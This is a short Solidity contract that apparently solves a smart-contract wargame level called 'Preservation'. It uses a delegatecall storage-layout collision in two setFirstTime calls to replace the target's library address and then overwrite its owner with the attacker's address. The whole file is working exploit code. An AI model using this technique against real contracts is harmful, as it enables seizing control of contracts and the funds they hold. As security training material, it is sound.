// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Preservation} from "../Preservation.sol";

contract PreservationAttacker {
    uint256[2] private __gap;
    // stores a timestamp
    uint256 storedTime;

    address attackerOwner;

    constructor(address _owner) {
        attackerOwner = _owner;
    }

    modifier onlyAttacker() {
        require(msg.sender == attackerOwner, "caller is not the owner");
        _;
    }

    function setTime(uint256 _time) public {
        storedTime = _time;
    }

    function attack(Preservation preservation) external onlyAttacker {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(attackerOwner)));
    }
}
